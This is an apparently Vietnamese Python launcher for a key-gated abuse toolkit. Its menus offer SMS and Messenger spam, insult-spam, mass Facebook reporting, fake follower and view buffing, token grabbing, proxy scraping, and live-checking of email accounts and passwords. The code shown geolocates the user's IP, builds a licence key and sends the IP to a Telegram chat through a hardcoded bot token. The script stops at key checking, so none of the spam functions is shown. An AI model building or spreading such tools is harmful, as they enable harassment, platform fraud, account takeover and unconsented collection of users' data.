from urllib.parse import quote
import datetime
import os
import ssl
import random
from urllib.parse import urlencode
from http import cookiejar
from urllib3.exceptions import InsecureRequestWarning
import hashlib
import uuid
try:
    import base64
    from requests.exceptions import RequestException
    from rich.panel import Panel
    import requests
    import pystyle
    from concurrent.futures import ThreadPoolExecutor
    from faker import Faker
    from requests import session
    import concurrent.futures
    
except ImportError:
    import os
    os.system("pip install rich")
    os.system("pip install faker")
    os.system("pip install colorama")
    os.system("pip install requests")
    os.system("pip install pystyle")
    os.system("pip install concurrent.futures")
    os.system("pip install base64")
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import datetime
from datetime import datetime
import requests,json
import uuid
import requests
from time import sleep
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile
from pystyle import Colors, Colorate, Write, Center, Add, Box
from time import sleep,strftime
import socket
from pystyle import *
response = requests.get('http://ipinfo.io')
ip_data = response.json()
Ip = ip_data.get('ip', 'N/A')
LOC = ip_data.get('loc', 'N/A')
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def xoa(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()

import datetime
import subprocess


now = datetime.datetime.now()
next_midnight = (now + datetime.timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
time_left = next_midnight - now

hours_left = time_left.seconds // 3600
minutes_left = (time_left.seconds % 3600) // 60
seconds_left = time_left.seconds % 60

today = datetime.datetime.today()
ngay = today.day
thang = today.day
os.environ['TZ'] = 'Asia/Ho_Chi_Minh'
ma = 13420709


def remove_dots(ip_address):
    return ip_address.replace(".", "")


def extract_numbers_from_string(input_string):
    numbers = ''.join(filter(str.isdigit, input_string))
    return numbers

loc = extract_numbers_from_string(LOC)
IPs = int(loc) + ma
IP = int(today.strftime("%Y%m%d")) + ma + int(loc)

ippp = 12344321
encoded_IP = base64.b64encode(str(IP).encode()).decode()
numbers = []
trang = "\033[1;37m\033[1m"
xanh_la = "\033[1;32m\033[1m"
xanh_duong = "\033[1;34m\033[1m"
xanhnhat = '\033[1m\033[38;5;51m'
do = "\033[1;31m\033[1m\033[1m"
xam='\033[1;30m\033[1m'
vang = "\033[1;33m\033[1m"
tim = "\033[1;35m\033[1m"
hongnhat = "#FFC0CB"
kt_code = "</>"
dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
list_clone = []
list_img = ['https://i.imgur.com/6jpjrQE.jpg','https://i.imgur.com/V6mUatb.jpg','https://i.imgur.com/J99z9DW.jpg','https://i.imgur.com/IlsOBxQ.jpg','https://i.imgur.com/PgnSnBG.jpg','https://i.imgur.com/HAKgMZM.jpg','https://i.imgur.com/U2uRuMq.png']
dem=0
stt = 0
stt2 = 0
while ippp > 0:
    digit = ippp % 10
    numbers.append(digit)
    ippp //= 10

numbers.reverse()

number_index = 0
result = ""

for i in range(len(encoded_IP)):
    result += encoded_IP[i]
    if number_index < len(numbers):
        result += str(numbers[number_index])
        number_index += 1

    
#======key thiet bi=========



ippps = 12344321
encoded_IP = base64.b64encode(str(IPs).encode()).decode()
numberss = []

while ippps > 0:
    digit = ippps % 10
    numberss.append(digit)
    ippps //= 10

numberss.reverse()

number_indexs = 0
results = ""
resultss = ""
for i in range(len(encoded_IP)):
    results += encoded_IP[i]
    if number_indexs < len(numberss):
        results += str(numberss[number_indexs])
        number_indexs += 1
#===========================
def save_key_to_file(key):
    with open("key.txt", "w") as file:
        file.write(key)

def read_key_from_file():
    try:
        with open("key.txt", "r") as file:
            return file.read().strip()
    except FileNotFoundError:
        return None

#==========================================================================================================================
banner = """
  \033[1;35m\033[1m       _                      _______                      _
      _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
     dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
     V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
              `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
               `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
          __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
        ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
     _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
                 `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
         ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
       ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
      ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
      MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
      YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
       `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
         `'                  `OObNNNNNdOO'                   `'
                               `~OOOOO~'
                               
                                              
                                        \033[4m\033[94mTools auto tds bằng pro5\033[0m
                               
                               
"""
daulau = f"""{xanh_la}

                             _________-----_____ "."
                  _____------           __      ----_ "."
           ___----             ___------              \ "."
              ----________        ----   0  0  0  0     \ "."
                          -----__    |   0  0 0     _____) "."
                               __-        0  0    /     \ "."
                   _______-----    ___--          \    /)\ "."
             ------_______      ---____            \__/  / "."
                          -----__    \ --    _          /\ "."
                                 --__--__     \_____/   \_/\ "."
{xanhnhat} _ \033[0m{xanh_la}                                     ----|   /          | "."
{tim}| |\033[0m{xanh_la}                                         |  |___________| "."
{do}| | ____ _ \033[0m{xanh_la}                                 |  | ((_(_)| )_) "."
{xanh_la}| |/ / _` |\033[0m{xanh_la}                                 |  \_((_(_)|/(_) "."
{xam}|   < (_| |\033[0m{xanh_la}                                  \             ( "."              
{vang}|_|\_\__,_|\033[0m{xanh_la}                                   \_____________) "."
"""
banner2 = """
\033[92m\033[1m
██╗ ██╗ █████╗          ███████╗██████╗ █████╗  ███╗  █ ██╗  ███████╗███╗   ███╗███████╗
██║ ██╔╝██╔══██╗        ██╔════╝██╔══██╗██╔══██╗████╗ ████║  ██╔════╝████╗ ████║██╔════╝
█████╔╝ ███████║ █████╗ ███████╗██████╔╝███████║██╔████╔██║  ███████╗██╔████╔██║███████╗
██╔═██╗ ██╔══██║ ╚════╝ ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║  ╚════██║██║╚██╔╝██║╚════██║
██║ ██╗ ██║  ██║        ███████║██║     ██║  ██║██║  ╚═╝██║  ███████║██║ ╚═╝ ██║███████║
╚═╝ ╚═╝ ╚═╝  ╚═╝         ╚════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═════╝╚═╝     ╚═╝╚══════╝
                                       


"""

chontool = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘

"""
tcts = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG BỊ vLong Dec</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Deccode\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
{xanh_la}Hạn Key: {tim}24 giờ{xanh_la}. Còn {tim}{hours_left} {vang}giờ {tim}{minutes_left} {vang}phút {tim}{seconds_left} {vang}giây\033[0m

                                          \033[1;34m╗{tim}╔\033[0m
          ╔════╦═══════════════════════╗  {tim}╚\033[1;36m╬{tim}╗\033[0m
         ╔╣ {xanh_duong}ID \033[0m║        {xanh_duong}DỊCH VỤ\033[0m        ║   \033[1;34m╝{tim}╚\033[0m   
         ║╠════╬═══════════════════════╬═══════╗
         ║║ {vang}1\033[0m  ║        {dac_biet}CÔNG CỤ\033[0m        ║  
         ║║ {vang}2\033[0m  ║        {dac_biet}FACEBOOK\033[0m       ║ 
         ║║ {vang}3\033[0m  ║       {dac_biet}TOOL PRO5\033[0m       ║ 
         ║║ {vang}4\033[0m  ║      {dac_biet}TRAO ĐỔI-SUB\033[0m     ║    
         ║║ {vang}5\033[0m  ║      {dac_biet}BUFF TIKTOK\033[0m      ║        
         ║║ {vang}6\033[0m  ║       {dac_biet}TOOL MAIL\033[0m       ║   
         ║║ {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║
         ╚╩════╩═══════════════════════╩═══════╝ 

"""
tct_vip = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
{xanh_la}Hạn Key: {vang}🥰vĩnh viễn🥰 \033[0m

                                          \033[1;34m╗{tim}╔\033[0m
          ╔════╦═══════════════════════╗  {tim}╚\033[1;36m╬{tim}╗\033[0m
         ╔╣ {xanh_duong}ID \033[0m║        {xanh_duong}DỊCH VỤ\033[0m        ║   \033[1;34m╝{tim}╚\033[0m   
         ║╠════╬═══════════════════════╬═══════╗
         ║║ {vang}1\033[0m  ║        {dac_biet}CÔNG CỤ\033[0m        ║  {xanh_la}╦╔═\033[0m  ║  
         ║║ {vang}2\033[0m  ║        {dac_biet}FACEBOOK\033[0m       ║  {vang}╠╩╗\033[0m  ║
         ║║ {vang}3\033[0m  ║       {dac_biet}TOOL PRO5\033[0m       ║  {tim}╩ ╩\033[0m  ║
         ║║ {vang}4\033[0m  ║      {dac_biet}TRAO ĐỔI-SUB\033[0m     ║   {xam}o\033[0m   ║   
         ║║ {vang}5\033[0m  ║      {dac_biet}BUFF TIKTOK\033[0m      ║  {do}╔═╗\033[0m  ║      
         ║║ {vang}6\033[0m  ║       {dac_biet}TOOL MAIL\033[0m       ║  {trang}╠═╣\033[0m  ║ 
         ║║ {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║  \033[1;36m╩ ╩\033[0m  ║
         ╚╩════╩═══════════════════════╩═══════╝ 

"""
ba  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
                                          
╔═════╦═══════════════════════╦═════════════════════╗  
║  {xanh_duong}ID \033[0m║        {xanh_duong}TOOL PRO5\033[0m      ║        {xanh_duong}STATUS\033[0m       ║
╠═════╬═══════════════════════╬═════════════════════╣
║ {vang}3.1\033[0m ║       {dac_biet}REG PRO5\033[0m        ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}3.2\033[0m ║    {dac_biet}BUFF VIEW STORY\033[0m    ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}3.3\033[0m ║     {dac_biet}BUFF FLOW PRO5\033[0m    ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}3.4\033[0m ║     {dac_biet}BUFF MEM GROUP\033[0m    ║      {xanh_la}hoạt động\033[0m      ║      
║ {vang}3.5\033[0m ║  {dac_biet}CHUYỂN QUYỀN ADMIN\033[0m   ║      {xanh_la}hoạt động\033[0m      ║  
║  {vang}0\033[0m  ║       {dac_biet}MAIN-MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
╚═════╩═══════════════════════╩═════════════════════╝ 

"""

bon  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
                                          
╔═════╦═══════════════════════╦═════════════════════╗  
║  {xanh_duong}ID \033[0m║     {xanh_duong}TRAO ĐỔI SUB\033[0m      ║        {xanh_duong}STATUS\033[0m       ║
╠═════╬═══════════════════════╬═════════════════════╣
║ {vang}4.1\033[0m ║     {dac_biet}TĐS BẰNG PRO5\033[0m     ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}4.2\033[0m ║      {dac_biet}TĐS TIKTOK\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}4.3\033[0m ║      {dac_biet}TĐS COOKIE\033[0m       ║       {do}bảo trì\033[0m       ║  
║ {vang}4.4\033[0m ║        {dac_biet}GOLIKE\033[0m         ║       {do}bảo trì\033[0m       ║      
║ {vang}4.5\033[0m ║     {dac_biet}TTC BẰNG PRO5\033[0m     ║       {do}bảo trì\033[0m       ║  
║  {vang}0\033[0m  ║       {dac_biet}MAIN-MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
╚═════╩═══════════════════════╩═════════════════════╝ 

"""
mot  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
                                          
╔═════╦═══════════════════════╦═════════════════════╗  
║  {xanh_duong}ID \033[0m║        {xanh_duong}CÔNG CỤ\033[0m        ║        {xanh_duong}STATUS\033[0m       ║
╠═════╬═══════════════════════╬═════════════════════╣
║ {vang}1.1\033[0m ║       {dac_biet}SPAM SMS\033[0m        ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}1.2\033[0m ║       {dac_biet}ĐÀO PROXY\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}1.3\033[0m ║     {dac_biet}LỌC LIVE PROXY\033[0m    ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}1.4\033[0m ║       {dac_biet}GET TOKEN \033[0m      ║      {xanh_la}hoạt động\033[0m      ║      
║ {vang}1.5\033[0m ║       {dac_biet}CHAT GPT\033[0m        ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}1.6\033[0m ║     {dac_biet}ĐÀO PROXY V2\033[0m      ║      {xanh_la}hoạt động\033[0m      ║ 
║  {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
╚═════╩═══════════════════════╩═════════════════════╝ 

"""

nam  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
                                          
╔═════╦═══════════════════════╦═════════════════════╗  
║  {xanh_duong}ID \033[0m║       {xanh_duong}BUFF TIKTOK\033[0m     ║        {xanh_duong}STATUS\033[0m       ║
╠═════╬═══════════════════════╬═════════════════════╣
║ {vang}5.1\033[0m ║       {dac_biet}BUFF-TIM\033[0m        ║       {do}bảo trì\033[0m       ║  
║ {vang}5.2\033[0m ║       {dac_biet}BUFF-VIEW\033[0m       ║       {do}bảo trì\033[0m       ║
║ {vang}5.3\033[0m ║    {dac_biet}BUFF-VIEW-PROXY\033[0m    ║       {do}bảo trì\033[0m       ║  
║  {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
╚═════╩═══════════════════════╩═════════════════════╝ 

"""
sau  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
                                          
╔═════╦═══════════════════════╦═════════════════════╗  
║  {xanh_duong}ID \033[0m║        {xanh_duong}TOOL MAIL\033[0m      ║        {xanh_duong}STATUS\033[0m       ║
╠═════╬═══════════════════════╬═════════════════════╣
║ {vang}6.1\033[0m ║     {dac_biet}TOOL ĐÀO MAIL\033[0m     ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}6.2\033[0m ║     {dac_biet}TOOL LỌC MAIL\033[0m     ║      {xanh_la}hoạt động\033[0m      ║
║  {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
╚═════╩═══════════════════════╩═════════════════════╝ 

"""

hai  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘

                                          
╔═════╦═══════════════════════╦═════════════════════╗  
║  {xanh_duong}ID \033[0m║       {xanh_duong}FACEBOOK\033[0m        ║        {xanh_duong}STATUS\033[0m       ║
╠═════╬═══════════════════════╬═════════════════════╣
║ {vang}2.1\033[0m ║    {dac_biet}SPAM MESSENGER\033[0m     ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}2.2\033[0m ║    {dac_biet}SHARE MAX SPEED\033[0m    ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}2.3\033[0m ║     {dac_biet}NUÔI FACENOOK\033[0m     ║      {xanh_la}hoạt động\033[0m      ║  
║ {vang}2.4\033[0m ║  {dac_biet}SPAM  BOX MESSENGER\033[0m  ║      {xanh_la}hoạt động\033[0m      ║      
║ {vang}2.5\033[0m ║    {dac_biet}REPORT FACENOOK\033[0m    ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}2.6\033[0m ║ {dac_biet}BUFF INSTAGRAM LIKES\033[0m  ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}2.7\033[0m ║  {dac_biet}SPAM CHỬI MESSENGER\033[0m  ║      {xanh_la}hoạt động\033[0m      ║
║ {vang}2.8\033[0m ║{dac_biet}SPAM CHỬI MESSENGER BOX\033[0m║      {xanh_la}hoạt động\033[0m      ║ 
║  {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
╚═════╩═══════════════════════╩═════════════════════╝ 

"""

nhen = """
\033[91m\033[1m
            #               #
          ##                 ##
         ##                   ##
        ##                     ##
        ##                     ##
        ##                     ##
         ##                   ##
     ##  ##                   ##  ##
    ##   ##                   ##   ##
   ##     ##                 ##     ##
   #       ###             ###       #
   ##       ###           ###       ##
   ###       ###  #####  ###       ###
    ######    #############   #######
         ######################
    ################################
   ### ########################## ###
  ###         ############         ###
 ##         #################        ##
 ##     ########################     ##
##     ###  ################  ###     ##
 ##    ##   #######  #######   ##    ##
  #    ##   #######  #######   ##    #
   #   ##   ################   ##   #
    #  ##    ##############    ##  #
       ##     ############     ##
       ##       ########       ##
        ##                    ##
        
                            \033[4m\033[94mtool defacement
\033[0m
"""

helpmenu  = f"""
  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
┌\033[1;37m───────────────────────────────────────────────────────┐
│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                 │
│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m vLong Dec\033[0m                                        │
│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
└\033[1;37m───────────────────────────────────────────────────────┘
                                       
╔═════════════╦══════════════════════════╗  
║   {xanh_duong}COMMAND   \033[0m║          {xanh_duong}ACTION\033[0m          ║
╠═════════════╬══════════════════════════╣
║    {xanh_la}!help\033[0m    ║ {vang}Menu Tools\033[0m               ║ 
║    {xanh_la}!o2pl\033[0m    ║ {vang}Lọc Live/Die o2.pl\033[0m       ║
║  {xanh_la}!passhot\033[0m   ║ {vang}Lọc Password Hotmail\033[0m     ║  
║  {xanh_la}!centrum\033[0m   ║ {vang}Lọc Live/Die Cemtrum.cz\033[0m  ║     
║   {xanh_la}!gmail\033[0m    ║ {vang}Lọc Live/Die Gmail\033[0m       ║ 
║  {xanh_la}!validfb\033[0m   ║ {vang}Lọc Liên Kết FB\033[0m          ║
║ {xanh_la}!livediehot\033[0m ║ {vang}Lọc Live/Die Hotmail\033[0m     ║
║   {xanh_la}!baoma\033[0m    ║ {vang}Lọc Bao Mã Email\033[0m         ║
║ {xanh_la}!passartnet\033[0m ║ {vang}Lọc Password Artnet.com\033[0m  ║
╚═════════════╩══════════════════════════╝ 

"""
#=====================================================================================================================


def runbanner(text, delay=0.001):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()
    

def chay(text):
    for char in text:
        print(char, end='', flush=True)
        delay=0.1
        sleep(delay)
    print()

    
Key = f"vLong Dec-{result}"
keytb = f"vLong Dec-{results}"
getlinkkeyhomnay = requests.get(f'https://link4m.co/api-shorten/v2?api=64f61755fb387214b610d7db&url=https://hoanganh.eu.org/key.html?keyhomnay={Key}')
linkkeyhomnay = getlinkkeyhomnay.json()['shortenedUrl']
def xoa(text):
    sys.stdout.write('\r' + text)
    sys.stdout.flush()
clear()
runbanner(chontool)


save = read_key_from_file()
url_to_open = "https://t.me/sharetoolngon"
c = input(f"{tim}Bạn đã có key chưa? (Y/N): {vang}")
if c.lower() == "n":
    print(f"{xanhnhat}Link lấy key: \033[4m\033[94m{linkkeyhomnay}\033[0m \n{xanh_la}Sau khi lấy key thành công. Vui lòng chạy lại tool và chọn {vang}y \033[0m{xanh_la}để nhập key nhé🥰\033[0m")
    exit()
elif c.lower() == "key":
  requests.get(f"https://api.telegram.org/bot6386148413:AAGJNu0qufFWtOSNJaLNfKtMWe05P_D9jpg/sendMessage?chat_id=5913051935&text=💻 key thiết bị 💻 \nip: {Ip}\nvLong Dec-{results}")
  exit()
elif c.lower() == "y":
    saved_key = read_key_from_file()
